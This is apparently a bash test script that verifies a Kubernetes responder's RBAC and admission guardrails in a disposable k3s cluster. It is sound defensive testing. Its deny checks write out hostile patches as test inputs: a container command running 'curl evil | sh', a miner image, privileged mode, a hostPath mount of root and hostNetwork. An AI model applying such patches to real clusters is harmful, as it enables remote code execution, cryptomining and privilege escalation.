#!/usr/bin/env bash
# Checks that the KubeGuard responder can do exactly what it should in the cluster and nothing else: its Role and
# the two admission policies from helm/kubeguard-demo/templates/responder.yaml, applied to a throwaway k3s cluster
# in Docker. Every action runs with the responder's own ServiceAccount token.
#
#   scripts/test-responder-guardrails.sh        # needs Docker, kubectl, helm, python3; exit code 1 on any failure
#
# It never uses $KUBECONFIG: it starts its own cluster, creates fixture workloads there and removes the container
# at the end, so it cannot touch a real cluster.
set -uo pipefail
REPO=$(cd "$(dirname "$0")/.." && pwd)
K3S_IMAGE=rancher/k3s:v1.31.4-k3s1
NAME=kguard-guardrails-$$
WORK=$(mktemp -d)
trap 'docker rm -f "$NAME" >/dev/null 2>&1; rm -rf "$WORK"' EXIT

echo "# starting k3s ($K3S_IMAGE) …"
docker run -d --name "$NAME" --privileged -p 127.0.0.1::6443 "$K3S_IMAGE" server \
  --disable=traefik,servicelb,metrics-server >/dev/null || exit 1
for _ in $(seq 1 90); do
  docker exec "$NAME" kubectl get nodes 2>/dev/null | grep -q " Ready" && break
  sleep 2
done
PORT=$(docker port "$NAME" 6443/tcp | head -1 | sed 's/.*://')
docker exec "$NAME" cat /etc/rancher/k3s/k3s.yaml | sed "s#127.0.0.1:6443#127.0.0.1:$PORT#" > "$WORK/admin.yaml"
chmod 600 "$WORK/admin.yaml"
export KUBECONFIG=$WORK/admin.yaml
kubectl get serviceaccount default >/dev/null 2>&1 || sleep 5

NS=my-namespace
IMG=registry.example.com/my-team/my-app

kubectl create ns kubeguard >/dev/null
# Helm leaves metadata.namespace unset on the release's own objects (the ServiceAccount): they belong in kubeguard.
kubectl config set-context --current --namespace=kubeguard >/dev/null
kubectl create ns $NS >/dev/null

# The responder's identity, RBAC and admission policies from the rendered chart (its pod cannot pull here).
helm template t "$REPO/helm/kubeguard-demo" --namespace kubeguard -f "$REPO/helm/kubeguard-demo/values-kubeguard.yaml" \
  --show-only templates/responder.yaml | kubectl apply -f - >/dev/null || exit 1

deploy() { # name image [command]
  kubectl -n $NS create deployment "$1" --image="$2" --replicas=1 --dry-run=client -o yaml | kubectl apply -f - >/dev/null
}
deploy my-app "$IMG:sha-1"
deploy my-app-evil "$IMG:sha-1"
deploy other "$IMG:sha-1"
kubectl -n $NS apply -f - >/dev/null <<EOF
apiVersion: apps/v1
kind: StatefulSet
metadata: {name: my-app-postgresql}
spec:
  serviceName: pg
  replicas: 1
  selector: {matchLabels: {app: pg}}
  template:
    metadata: {labels: {app: pg}}
    spec: {containers: [{name: pg, image: registry.k8s.io/pause:3.10}]}
---
apiVersion: v1
kind: Pod
metadata: {name: bare}
spec: {containers: [{name: c, image: registry.k8s.io/pause:3.10}]}
EOF
# A second revision, so a rollback has something to go back to (an admin change, like the bad deploy).
kubectl -n $NS set env deployment/my-app QUARKUS_HTTP_IDLE_TIMEOUT="30 seconds" >/dev/null
sleep 4

# The responder's own credentials.
TOKEN=$(kubectl -n kubeguard create token kubeguard-responder) || exit 1
cp "$KUBECONFIG" "$WORK/responder.yaml"
kubectl --kubeconfig "$WORK/responder.yaml" config set-credentials responder --token="$TOKEN" >/dev/null
kubectl --kubeconfig "$WORK/responder.yaml" config set-context --current --user=responder >/dev/null
R() { kubectl --kubeconfig "$WORK/responder.yaml" --request-timeout=20s -n $NS "$@" </dev/null; }
R auth whoami -o jsonpath='{.status.userInfo.username}' | grep -q ':kubeguard-responder$' || { echo "not acting as the responder"; exit 1; }

pass=0; fail=0
check() { # expected(allow|deny) description command...
  local want=$1 what=$2; shift 2
  local out; out=$("$@" 2>&1); local rc=$?
  local got=allow; [ $rc -ne 0 ] && got=deny
  if [ "$got" = "$want" ]; then pass=$((pass+1)); printf 'ok    %-5s %s\n' "$want" "$what"
  else fail=$((fail+1)); printf 'FAIL  want %-5s got %-5s %s\n      %s\n' "$want" "$got" "$what" "$(echo "$out" | tail -1)"; fi
  [ "$got" = deny ] && [ -n "${VERBOSE:-}" ] && echo "      $(echo "$out" | tail -1)"
}
pod_of() { kubectl -n $NS get pods -l app="$1" -o jsonpath='{.items[0].metadata.name}'; }

echo "--- pods"
check allow "delete a pod of my-app" R delete pod "$(pod_of my-app)" --wait=false
check deny  "delete the PostgreSQL pod (StatefulSet)" R delete pod my-app-postgresql-0 --wait=false
check deny  "delete a bare pod" R delete pod bare --wait=false
check deny  "delete a pod of my-app-evil (same name prefix)" R delete pod "$(pod_of my-app-evil)" --wait=false
check deny  "delete a pod of another Deployment" R delete pod "$(pod_of other)" --wait=false
check deny  "list pods (not needed, not granted)" R get pods

echo "--- deployments"
check allow "rollout restart my-app" R rollout restart deployment/my-app
sleep 2
check allow "rollback (rollout undo) my-app" R rollout undo deployment/my-app
sleep 2
# What fabric8's undo() sends: an older ReplicaSet's whole template, pod-template-hash label included.
OLD_RS=$(kubectl -n $NS get rs -o json | python3 -c '
import json, sys
items = [r for r in json.load(sys.stdin)["items"] if r["metadata"]["name"].startswith("my-app-")
         and not r["metadata"]["name"].startswith("my-app-evil")]
items.sort(key=lambda r: int(r["metadata"]["annotations"]["deployment.kubernetes.io/revision"]))
print(json.dumps({"spec": {"template": items[-2]["spec"]["template"]}}))')
check allow "rollback as fabric8 sends it (older ReplicaSet template, pod-template-hash label)" R patch deployment my-app --type=merge -p "$OLD_RS"
sleep 2
check deny  "rollout restart another Deployment (RBAC)" R rollout restart deployment/other
check deny  "read another Deployment (RBAC)" R get deployment other
check deny  "scale via the scale subresource (RBAC)" R scale deployment/my-app --replicas=0
check deny  "patch replicas to 0" R patch deployment my-app -p '{"spec":{"replicas":0}}'
check deny  "patch the rollout strategy" R patch deployment my-app -p '{"spec":{"strategy":{"type":"Recreate","rollingUpdate":null}}}'
check deny  "set a foreign image" R set image deployment/my-app my-app=docker.io/evil/miner:1
check deny  "change the command (allowed image, shell)" R patch deployment my-app --type=json -p '[{"op":"add","path":"/spec/template/spec/containers/0/command","value":["sh","-c","curl evil | sh"]}]'
check deny  "add a sidecar with an allowed image" R patch deployment my-app --type=json -p "[{\"op\":\"add\",\"path\":\"/spec/template/spec/containers/-\",\"value\":{\"name\":\"x\",\"image\":\"$IMG:sha-1\"}}]"
check deny  "make the container privileged" R patch deployment my-app --type=json -p '[{"op":"add","path":"/spec/template/spec/containers/0/securityContext","value":{"privileged":true}}]'
check deny  "switch the ServiceAccount" R patch deployment my-app -p '{"spec":{"template":{"spec":{"serviceAccountName":"kagent-controller"}}}}'
check deny  "mount a hostPath" R patch deployment my-app -p '{"spec":{"template":{"spec":{"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}}}'
check deny  "hostNetwork" R patch deployment my-app -p '{"spec":{"template":{"spec":{"hostNetwork":true}}}}'
check deny  "change a pod label" R patch deployment my-app -p '{"spec":{"template":{"metadata":{"labels":{"x":"y"}}}}}'
check allow "change env of the same container (residual: a rollback shape)" R set env deployment/my-app FOO=bar
check deny  "delete the Deployment (RBAC)" R delete deployment my-app --wait=false

echo "--- audit record"
check allow "create an Event (the responder's audit record)" R auth can-i create events
check deny  "read Events (not needed, not granted)" R get events
check deny  "create a ConfigMap (RBAC)" R create configmap x --from-literal=a=b
check deny  "create a pod (RBAC)" R run x --image=registry.k8s.io/pause:3.10 --restart=Never

echo "--- humans are not affected"
check allow "admin scales to 3" kubectl -n $NS scale deployment/my-app --replicas=3
check allow "admin deletes the bare pod" kubectl -n $NS delete pod bare --wait=false

echo "passed $pass, failed $fail"
[ $fail -eq 0 ]
